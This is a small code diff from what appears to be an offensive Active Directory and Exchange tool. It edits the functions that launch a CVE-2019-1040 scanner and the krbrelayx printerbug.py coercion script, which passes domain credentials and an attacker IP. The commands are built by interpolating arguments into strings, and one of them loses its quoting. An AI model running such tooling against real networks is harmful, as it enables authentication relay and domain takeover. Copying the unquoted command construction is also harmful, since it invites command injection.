@@ -102,10 +102,10 @@ def start_exchange_scan(args):
     if args.exchange_file:
         with open(args.exchange_file, "r") as f:
             target = f.readlines()[0].strip()
-        cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}'
+        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}"
 
     elif args.exchange_server:
-        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py '{args.user}@{args.exchange_server}'"
+        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py {args.user}@{args.exchange_server}"
 
     name = "exchange_scanner"
     scan = start_process(cmd, name, live_output=True)
@@ -113,7 +113,7 @@ def start_exchange_scan(args):
     return scan
 
 def start_printerbug(dom_user_passwd, exchange_server, local_ip):
-    cmd = f'python {cwd}/tools/krbrelayx/printerbug.py {dom_user_passwd}@{exchange_server} {local_ip}'
+    cmd = f"python {cwd}/tools/krbrelayx/printerbug.py {dom_user_passwd}@{exchange_server} {local_ip}"
     name = 'printerbug'
     printerbug = start_process(cmd, name)
 
